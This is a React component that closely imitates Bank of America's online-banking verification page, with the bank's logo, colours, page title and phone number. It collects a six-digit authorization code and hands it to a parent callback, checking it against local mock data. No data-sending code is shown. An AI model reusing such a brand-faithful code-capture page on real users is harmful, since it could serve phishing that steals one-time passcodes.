import React, { useState, useRef, useEffect } from 'react';
import {
  AlertCircle,
  CheckCircle2,
  Lock,
  Mail,
  Smartphone,
  Loader2,
  RefreshCw,
  ShieldCheck,
  X,
} from 'lucide-react';
import { BofALogo, FdicBar } from './BofALogo';
import { BofAFooter } from './BofAFooter';
import { AUTH_CONFIG, isValidOtpCode } from '../data/bankData';

interface OtpVerificationPageProps {
  onVerified: (usedCode: string, rememberDevice: boolean) => void;
  onCancel: () => void;
}

export const OtpVerificationPage: React.FC<OtpVerificationPageProps> = ({
  onVerified,
  onCancel,
}) => {
  const [digits, setDigits] = useState<string[]>(['', '', '', '', '', '']);
  const [channel, setChannel] = useState<'sms' | 'email'>('sms');
  const [rememberDevice, setRememberDevice] = useState<boolean>(true);
  const [error, setError] = useState<string | null>(null);
  const [resendNotice, setResendNotice] = useState<string | null>(null);
  const [resendCooldown, setResendCooldown] = useState<number>(0);
  const [status, setStatus] = useState<'idle' | 'checking' | 'verified'>('idle');
  const [modalInfo, setModalInfo] = useState<{ title: string; body: string } | null>(null);

  const inputRefs = useRef<Array<HTMLInputElement | null>>([]);

  useEffect(() => {
    document.title = 'Bank of America | Online Banking | Verify Your Identity';
    inputRefs.current[0]?.focus();
  }, []);

  useEffect(() => {
    if (resendCooldown <= 0) return;
    const timer = window.setInterval(() => {
      setResendCooldown((prev) => (prev <= 1 ? 0 : prev - 1));
    }, 1000);
    return () => window.clearInterval(timer);
  }, [resendCooldown]);

  const codeValue = digits.join('');

  const handleDigitChange = (index: number, raw: string) => {
    if (status !== 'idle') return;
    const numeric = raw.replace(/\D/g, '');
    if (error) setError(null);

    // Handle paste or autofill into a single box
    if (numeric.length > 1) {
      const sliced = numeric.slice(0, 6).split('');
      const next = ['', '', '', '', '', ''];
      sliced.forEach((ch, idx) => {
        next[idx] = ch;
      });
      setDigits(next);
      const focusIdx = Math.min(sliced.length, 5);
      inputRefs.current[focusIdx]?.focus();
      return;
    }

    const next = [...digits];
    next[index] = numeric;
    setDigits(next);

    if (numeric && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (status !== 'idle') return;

    if (e.key === 'Backspace') {
      if (digits[index]) {
        const next = [...digits];
        next[index] = '';
        setDigits(next);
      } else if (index > 0) {
        const next = [...digits];
        next[index - 1] = '';
        setDigits(next);
        inputRefs.current[index - 1]?.focus();
      }
      if (error) setError(null);
      e.preventDefault();
    } else if (e.key === 'ArrowLeft' && index > 0) {
      inputRefs.current[index - 1]?.focus();
      e.preventDefault();
    } else if (e.key === 'ArrowRight' && index < 5) {
      inputRefs.current[index + 1]?.focus();
      e.preventDefault();
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    if (status !== 'idle') return;
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (!pasted) return;
    const next = ['', '', '', '', '', ''];
    pasted.split('').forEach((ch, idx) => {
      next[idx] = ch;
    });
    setDigits(next);
    setError(null);
    inputRefs.current[Math.min(pasted.length, 5)]?.focus();
  };

  const handleChannelSwitch = (nextChannel: 'sms' | 'email') => {
    if (nextChannel === channel || status !== 'idle') return;
    setChannel(nextChannel);
    setError(null);
    setResendNotice(
      nextChannel === 'sms'
        ? `A new 6-digit Authorization Code was sent by text message to ${AUTH_CONFIG.maskedPhone}.`
        : `A new 6-digit Authorization Code was sent by email to ${AUTH_CONFIG.maskedEmail}.`
    );
    inputRefs.current[0]?.focus();
  };

  const handleResend = () => {
    if (resendCooldown > 0 || status !== 'idle') return;
    setDigits(['', '', '', '', '', '']);
    setError(null);
    setResendCooldown(30);
    const dest =
      channel === 'sms'
        ? `text message to ${AUTH_CONFIG.maskedPhone}`
        : `email to ${AUTH_CONFIG.maskedEmail}`;
    setResendNotice(`A new 6-digit Authorization Code has been sent via ${dest}.`);
    inputRefs.current[0]?.focus();
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (status !== 'idle') return;

    if (codeValue.length < 6) {
      setError('Please enter the complete 6-digit Authorization Code to continue.');
      const firstEmpty = digits.findIndex((d) => !d);
      inputRefs.current[firstEmpty >= 0 ? firstEmpty : 0]?.focus();
      return;
    }

    setError(null);
    setStatus('checking');

    window.setTimeout(() => {
      if (isValidOtpCode(codeValue)) {
        setStatus('verified');
        window.setTimeout(() => {
          onVerified(codeValue, rememberDevice);
        }, 520);
      } else {
        setStatus('idle');
        setError(
          'The Authorization Code you entered is not recognized or has expired. Please check your 6-digit code and try again.'
        );
        setDigits(['', '', '', '', '', '']);
        window.setTimeout(() => inputRefs.current[0]?.focus(), 20);
      }
    }, 360);
  };

  const destinationDisplay =
    channel === 'sms' ? AUTH_CONFIG.maskedPhone : AUTH_CONFIG.maskedEmail;

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Official FDIC Top Utility Strip */}
      <div className="bg-[#F4F5F7] border-b border-[#E4E7EC]">
        <div className="mx-auto max-w-[1060px] px-5 sm:px-8 flex items-center justify-between min-h-[34px] py-1">
          <FdicBar compact />
          <span className="hidden md:inline text-[11.5px] text-[#52565C]">
            Signed in as <strong className="font-medium text-[#1C1C1C]">{AUTH_CONFIG.displayName}</strong>
          </span>
        </div>
      </div>

      {/* Main Header */}
      <header className="bg-white">
        <div className="mx-auto max-w-[1060px] px-5 sm:px-8 py-4 sm:py-5 flex items-center justify-between gap-4">
          <div className="flex items-center gap-4 min-w-0">
            <BofALogo height={28} className="hidden sm:block -mt-1" />
            <BofALogo height={21} className="block sm:hidden -mt-0.5 max-w-[210px]" />
            <span
              className="hidden sm:inline-block h-5 w-px bg-[#D4D8DF]"
              aria-hidden="true"
            />
            <span className="hidden sm:inline-block text-[15px] text-[#595959]">
              Online Banking
            </span>
          </div>
          <div className="flex items-center gap-1.5 text-[12px] text-[#595959] shrink-0">
            <Lock className="w-3.5 h-3.5 text-[#595959]" strokeWidth={2} />
            <span>Secure Area</span>
          </div>
        </div>

        {/* Official Crimson Band */}
        <div className="bg-[#E31837] text-white">
          <div className="mx-auto max-w-[1060px] px-5 sm:px-8 py-3.5 sm:py-4">
            <h1 className="text-[20px] sm:text-[23px] font-normal tracking-[-0.01em] leading-tight">
              Verify Your Identity
            </h1>
          </div>
        </div>
      </header>

      {/* Main 2-Step Verification Workspace */}
      <main className="flex-1 bg-white">
        <div className="mx-auto max-w-[1060px] px-5 sm:px-8 py-8 sm:py-11 bofa-fade-in">
          {/* Subtle Step Context */}
          <div className="flex items-center gap-2 text-[12.5px] text-[#595959] mb-5">
            <ShieldCheck className="w-4 h-4 text-[#012169]" strokeWidth={1.9} />
            <span className="font-medium text-[#012169]">2-Step Verification</span>
            <span aria-hidden="true" className="text-[#C0C5CE]">·</span>
            <span>Extra Security Check</span>
          </div>

          <div className="max-w-[580px]">
            <h2 className="text-[21px] font-medium text-[#1C1C1C] tracking-[-0.01em] mb-2">
              Enter your Authorization Code
            </h2>
            <p className="text-[14px] leading-relaxed text-[#4A4E54] mb-6">
              For your account protection, we sent a temporary 6-digit
              Authorization Code to{' '}
              <span className="font-semibold text-[#1C1C1C] tabular-nums">
                {destinationDisplay}
              </span>
              . Enter the code below to access your Bank of America Online
              Banking profile.
            </p>

            {/* Delivery Method Toggle */}
            <div className="mb-6">
              <span className="block text-[12.5px] font-semibold text-[#333840] mb-2">
                Delivery method
              </span>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                <button
                  type="button"
                  onClick={() => handleChannelSwitch('sms')}
                  className={`flex items-center gap-3 px-3.5 py-2.5 rounded-[3px] border text-left transition-colors cursor-pointer ${
                    channel === 'sms'
                      ? 'border-[#0065B3] bg-[#F3F8FC] text-[#012169]'
                      : 'border-[#D5D9E0] bg-white text-[#333840] hover:border-[#8C939E]'
                  }`}
                >
                  <Smartphone
                    className={`w-4 h-4 shrink-0 ${
                      channel === 'sms' ? 'text-[#0065B3]' : 'text-[#666B73]'
                    }`}
                    strokeWidth={1.8}
                  />
                  <div className="min-w-0">
                    <div className="text-[13px] font-semibold leading-tight">
                      Text message (SMS)
                    </div>
                    <div className="text-[12px] text-[#595959] tabular-nums truncate">
                      {AUTH_CONFIG.maskedPhone}
                    </div>
                  </div>
                </button>

                <button
                  type="button"
                  onClick={() => handleChannelSwitch('email')}
                  className={`flex items-center gap-3 px-3.5 py-2.5 rounded-[3px] border text-left transition-colors cursor-pointer ${
                    channel === 'email'
                      ? 'border-[#0065B3] bg-[#F3F8FC] text-[#012169]'
                      : 'border-[#D5D9E0] bg-white text-[#333840] hover:border-[#8C939E]'
                  }`}
                >
                  <Mail
                    className={`w-4 h-4 shrink-0 ${
                      channel === 'email' ? 'text-[#0065B3]' : 'text-[#666B73]'
                    }`}
                    strokeWidth={1.8}
                  />
                  <div className="min-w-0">
                    <div className="text-[13px] font-semibold leading-tight">
                      Email address
                    </div>
                    <div className="text-[12px] text-[#595959] truncate">
                      {AUTH_CONFIG.maskedEmail}
                    </div>
                  </div>
                </button>
              </div>
            </div>

            {/* Resent Confirmation Banner */}
            {resendNotice && !error && status === 'idle' && (
              <div
                role="status"
                className="mb-5 flex items-start gap-2.5 border border-[#C6DBEE] border-l-4 border-l-[#0065B3] bg-[#F3F8FC] px-3.5 py-2.5 text-[13px] text-[#1C2A39]"
              >
                <CheckCircle2 className="w-4 h-4 text-[#0065B3] shrink-0 mt-0.5" />
                <span>{resendNotice}</span>
              </div>
            )}

            {/* Verified Success Banner */}
            {status === 'verified' && (
              <div
                role="status"
                className="mb-5 flex items-center gap-2.5 border border-[#B8DEC9] border-l-4 border-l-[#0B6B3A] bg-[#F1FAF5] px-4 py-3 text-[13.5px] font-medium text-[#0B5A31]"
              >
                <CheckCircle2 className="w-4 h-4 text-[#0B6B3A] shrink-0" />
                <span>Identity verified. Loading your Accounts Overview...</span>
              </div>
            )}

            {/* Error Banner */}
            {error && (
              <div
                role="alert"
                className="mb-5 flex items-start gap-2.5 border border-[#F0C2C8] border-l-4 border-l-[#C41230] bg-[#FDF3F4] px-4 py-3 text-[13px] text-[#7F1020] leading-snug"
              >
                <AlertCircle
                  className="w-4 h-4 text-[#C41230] shrink-0 mt-0.5"
                  strokeWidth={2}
                />
                <span>{error}</span>
              </div>
            )}

            {/* 6-Digit Authorization Code Form */}
            <form onSubmit={handleSubmit} noValidate>
              <div className="mb-3">
                <label
                  htmlFor="otp-digit-0"
                  className="block text-[14px] font-semibold text-[#1C1C1C] mb-2"
                >
                  Authorization Code (6 digits)
                </label>

                <div
                  className="flex items-center gap-2 sm:gap-2.5"
                  role="group"
                  aria-label="6-digit Authorization Code"
                >
                  {digits.map((digit, index) => (
                    <input
                      key={index}
                      id={`otp-digit-${index}`}
                      ref={(el) => {
                        inputRefs.current[index] = el;
                      }}
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      autoComplete={index === 0 ? 'one-time-code' : 'off'}
                      maxLength={6}
                      disabled={status !== 'idle'}
                      aria-label={`Digit ${index + 1} of 6`}
                      value={digit}
                      onFocus={(e) => e.currentTarget.select()}
                      onChange={(e) => handleDigitChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      onPaste={handlePaste}
                      className={`w-[44px] sm:w-[52px] h-[52px] sm:h-[56px] text-center text-[22px] font-semibold font-mono-code rounded-[3px] border bg-white transition-colors focus:outline-none focus:ring-2 ${
                        status === 'verified'
                          ? 'border-[#0B6B3A] bg-[#F1FAF5] text-[#0B5A31]'
                          : error
                          ? 'border-[#C41230] focus:border-[#C41230] focus:ring-[#C41230]/20 text-[#1C1C1C]'
                          : 'border-[#8A8F99] hover:border-[#4A5058] focus:border-[#0065B3] focus:ring-[#0065B3]/25 text-[#012169]'
                      }`}
                    />
                  ))}
                </div>
              </div>

              {/* Resend Link */}
              <div className="mb-7 flex items-center gap-3 text-[13px]">
                <button
                  type="button"
                  onClick={handleResend}
                  disabled={resendCooldown > 0 || status !== 'idle'}
                  className="inline-flex items-center gap-1.5 text-[#0065B3] hover:text-[#004E8C] hover:underline disabled:text-[#7A8089] disabled:no-underline cursor-pointer disabled:cursor-default"
                >
                  <RefreshCw className="w-3.5 h-3.5" strokeWidth={2} />
                  <span>
                    {resendCooldown > 0
                      ? `Send a new code in ${resendCooldown}s`
                      : "Didn't receive a code? Send a new code"}
                  </span>
                </button>
              </div>

              {/* Recognize This Device (Classic BofA prompt) */}
              <fieldset className="mb-7 pt-5 border-t border-[#E5E7EB]">
                <legend className="text-[13.5px] font-semibold text-[#1C1C1C] mb-2.5">
                  Should we recognize this device on future logins?
                </legend>
                <div className="space-y-2 text-[13.5px] text-[#333840]">
                  <label className="flex items-center gap-2.5 cursor-pointer select-none">
                    <input
                      type="radio"
                      name="rememberDevice"
                      checked={rememberDevice}
                      onChange={() => setRememberDevice(true)}
                      className="w-4 h-4 accent-[#0065B3] cursor-pointer"
                    />
                    <span>Yes, recognize this device</span>
                  </label>
                  <label className="flex items-center gap-2.5 cursor-pointer select-none">
                    <input
                      type="radio"
                      name="rememberDevice"
                      checked={!rememberDevice}
                      onChange={() => setRememberDevice(false)}
                      className="w-4 h-4 accent-[#0065B3] cursor-pointer"
                    />
                    <span>No, this is a shared or public device</span>
                  </label>
                </div>
              </fieldset>

              {/* Action Buttons */}
              <div className="flex flex-wrap items-center gap-3">
                <button
                  type="submit"
                  disabled={status !== 'idle'}
                  className="inline-flex items-center justify-center gap-2 min-w-[144px] h-[42px] px-7 bg-[#0065B3] hover:bg-[#004E8C] active:bg-[#003F73] disabled:opacity-75 text-white text-[14.5px] font-medium rounded-[3px] transition-colors cursor-pointer"
                >
                  {status === 'checking' ? (
                    <>
                      <Loader2 className="w-4 h-4 animate-spin" />
                      <span>Verifying...</span>
                    </>
                  ) : status === 'verified' ? (
                    <>
                      <CheckCircle2 className="w-4 h-4" />
                      <span>Verified</span>
                    </>
                  ) : (
                    <span>Submit</span>
                  )}
                </button>

                <button
                  type="button"
                  onClick={onCancel}
                  disabled={status !== 'idle'}
                  className="inline-flex items-center justify-center min-w-[110px] h-[42px] px-6 bg-white hover:bg-[#F4F5F7] text-[#0065B3] border border-[#0065B3] text-[14.5px] font-medium rounded-[3px] transition-colors cursor-pointer"
                >
                  Cancel
                </button>
              </div>

              <p className="mt-6 text-[12px] leading-relaxed text-[#666B73]">
                We will never ask you to read back your Authorization Code over
                the phone. For help, call Bank of America at 1-800-432-1000.
              </p>
            </form>
          </div>
        </div>
      </main>

      {modalInfo && (
        <div
          className="fixed inset-0 z-50 bg-black/40 flex items-center justify-center p-4"
          onClick={() => setModalInfo(null)}
        >
          <div
            role="dialog"
            aria-modal="true"
            className="bg-white w-full max-w-[460px] rounded-[4px] border border-[#D4D8DF] shadow-xl overflow-hidden bofa-fade-in"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center justify-between px-6 py-4 border-b border-[#E5E7EB] border-t-3 border-t-[#E31837]">
              <h3 className="text-[16px] font-semibold text-[#012169]">
                {modalInfo.title}
              </h3>
              <button
                type="button"
                onClick={() => setModalInfo(null)}
                aria-label="Close dialog"
                className="text-[#595959] hover:text-[#1C1C1C] p-1 cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>
            </div>
            <div className="px-6 py-5 text-[13.5px] leading-relaxed text-[#333840]">
              {modalInfo.body}
            </div>
            <div className="px-6 py-3.5 bg-[#F6F7F9] border-t border-[#E5E7EB] flex justify-end">
              <button
                type="button"
                onClick={() => setModalInfo(null)}
                className="px-5 py-2 bg-[#0065B3] hover:bg-[#004E8C] text-white text-[13.5px] font-medium rounded-[3px] cursor-pointer"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      <BofAFooter
        onInfoLink={(title, body) => setModalInfo({ title, body })}
      />
    </div>
  );
};
